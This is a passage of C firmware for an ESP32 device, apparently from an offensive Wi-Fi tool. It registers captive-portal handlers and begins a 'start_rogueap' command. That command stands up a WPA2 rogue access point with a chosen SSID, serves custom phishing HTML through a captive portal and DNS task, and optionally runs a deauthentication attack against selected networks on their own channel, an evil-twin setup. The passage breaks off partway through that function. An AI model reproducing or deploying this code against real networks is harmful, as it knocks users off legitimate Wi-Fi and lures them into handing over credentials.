brokali/projectZeroTouch/ESP32C5/main/main.c
    httpd_uri_t write_uri = { .uri = "/api/write", .method = HTTP_POST, .handler = admin_write_handler };
    httpd_register_uri_handler(portal_server, &write_uri);

    httpd_uri_t rename_uri = { .uri = "/api/rename", .method = HTTP_POST, .handler = admin_rename_handler };
    httpd_register_uri_handler(portal_server, &rename_uri);

    httpd_uri_t delete_uri = { .uri = "/api/delete", .method = HTTP_POST, .handler = admin_delete_handler };
    httpd_register_uri_handler(portal_server, &delete_uri);

    httpd_uri_t root_uri = { .uri = "/", .method = HTTP_GET, .handler = admin_root_handler };
    httpd_register_uri_handler(portal_server, &root_uri);

    // Catch-all so OS captive-portal detection URLs also load the admin UI.
    httpd_uri_t catchall_uri = { .uri = "/*", .method = HTTP_GET, .handler = admin_root_handler };
    httpd_register_uri_handler(portal_server, &catchall_uri);

    portal_active = true;

    BaseType_t task_ret = xTaskCreate(
        dns_server_task,
        "dns_server",
        4096,
        NULL,
        5,
        &dns_server_task_handle
    );
    if (task_ret != pdPASS) {
        portal_active = false;
        httpd_stop(portal_server);
        portal_server = NULL;
        esp_wifi_stop();
        return 1;
    }

    MY_LOG_INFO(TAG, "Admin portal started. Connect to '%s' (WPA2) and open http://172.0.0.1", ssid);

    esp_err_t led_err = led_set_color(0, 255, 255); // Cyan for admin portal mode
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for admin portal mode: %s", esp_err_to_name(led_err));
    }

    return 0;
}

// Start password-protected rogue AP with captive portal and optional deauth
static int cmd_start_rogueap(int argc, char **argv) {
    oled_display_update_full("> Rogue AP",
        argc >= 2 ? argv[1] : "  No SSID",
        "  WPA2 + Portal", "  Active...");
    rogueap_mode_active = true;
    log_memory_info("start_rogueap");
    
    // Validate arguments
    if (argc < 3) {
        MY_LOG_INFO(TAG, "Usage: start_rogueap <SSID> <password>");
        MY_LOG_INFO(TAG, "Example: start_rogueap MyNetwork MyPassword123");
        return 1;
    }
    
    const char *ssid = argv[1];
    const char *password = argv[2];
    size_t ssid_len = strlen(ssid);
    size_t password_len = strlen(password);
    
    // Validate SSID length (WiFi SSID max is 32 characters)
    if (ssid_len == 0 || ssid_len > 32) {
        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
        return 1;
    }
    
    // Validate password length (WPA2 requires 8-63 characters)
    if (password_len < 8 || password_len > 63) {
        MY_LOG_INFO(TAG, "Password length must be between 8 and 63 characters for WPA2");
        return 1;
    }
    
    // Check if custom HTML is selected via select_html
    if (custom_portal_html == NULL) {
        MY_LOG_INFO(TAG, "No custom HTML selected. Use 'select_html' command first.");
        MY_LOG_INFO(TAG, "Example: list_html, then select_html <number>");
        return 1;
    }
    
    // Check if portal is already running
    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Check if deauth attack is already running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        MY_LOG_INFO(TAG, "Failed to initialize WiFi");
        return 1;
    }
    
    // Reset stop flag
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting Rogue AP with SSID: %s (WPA2 protected)", ssid);
    
    // If networks are selected, prepare for deauth
    bool deauth_enabled = (g_selected_count > 0);
    if (deauth_enabled) {
        MY_LOG_INFO(TAG, "Networks selected: %d - deauth attack will run alongside portal", g_selected_count);
        applicationState = DEAUTH_EVIL_TWIN;  // Same state as evil twin for channel parking
    } else {
        MY_LOG_INFO(TAG, "No networks selected - portal only mode (no deauth)");
        // Keep IDLE state - portal_active flag handles the portal functionality
    }
    
    // Store portal SSID for logging purposes
    if (portalSSID != NULL) {
        free(portalSSID);
    }
    portalSSID = malloc(ssid_len + 1);
    if (portalSSID != NULL) {
        strcpy(portalSSID, ssid);
    }
    
    // Enable AP mode and get AP netif
    esp_netif_t *ap_netif = ensure_ap_mode();
    if (!ap_netif) {
        MY_LOG_INFO(TAG, "Failed to enable AP mode");
        applicationState = IDLE;
        return 1;
    }
    
    // Stop DHCP server to configure custom IP
    esp_netif_dhcps_stop(ap_netif);
    
    // Set static IP 172.0.0.1 for AP
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
        applicationState = IDLE;
        return 1;
    }
    
    MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
    
    // Configure AP with WPA2-PSK authentication
    wifi_config_t ap_config = {0};
    memcpy(ap_config.ap.ssid, ssid, ssid_len);
    ap_config.ap.ssid_len = ssid_len;
    strncpy((char*)ap_config.ap.password, password, sizeof(ap_config.ap.password) - 1);
    ap_config.ap.max_connection = 4;
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    
    // Use first selected network's channel if available, otherwise channel 1
    if (deauth_enabled && target_bssid_count > 0) {
        ap_config.ap.channel = target_bssids[0].channel;
        MY_LOG_INFO(TAG, "Using channel %d from first selected network", ap_config.ap.channel);
    } else if (deauth_enabled && g_selected_count > 0) {
        // target_bssids not yet saved, get from scan results
        int idx = g_selected_indices[0];
        ap_config.ap.channel = g_scan_results[idx].primary;
        MY_LOG_INFO(TAG, "Using channel %d from first selected network", ap_config.ap.channel);
    } else {
        ap_config.ap.channel = 1;
    }
    
